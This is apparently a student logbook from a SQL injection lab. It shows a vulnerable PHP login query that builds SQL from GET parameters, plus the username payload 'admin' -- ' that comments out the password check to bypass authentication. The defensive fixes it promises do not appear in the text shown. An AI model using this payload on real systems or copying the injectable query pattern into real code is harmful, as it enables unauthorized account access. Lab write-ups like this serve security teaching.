# SQL Injection LogBook

This logbook pretends to documentante the work that was made in the SQL Injection lab, deduce some conclusions, identify the errors that were commited as well as to suggest the mosifications that would make the system secure to this type of attacks.


## Task 2

In this attack, we were presented to the php file that is being ran under the server side

```php
$input_uname = $_GET[’username’];
$input_pwd = $_GET[’Password’];
$hashed_pwd = sha1($input_pwd);
...
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
               nickname, Password
        FROM credential
        WHERE name= ’$input_uname’ and Password=’$hashed_pwd’";
$result = $conn -> query($sql);
```

Considering that we know the code, it is really easy to exploit this vulnerability:

`username: admin' -- `


`password: <anything> `

This approach works, because the sql statement that will be queried to the database will be partionally connected and, with that, we can enter the system:

```sql
    SELECT id, name, eid, salary, birth, ssn, address, email,
               nickname, Password
        FROM credential
        WHERE name= ’admin’ -- and Password=’<anything>";
```
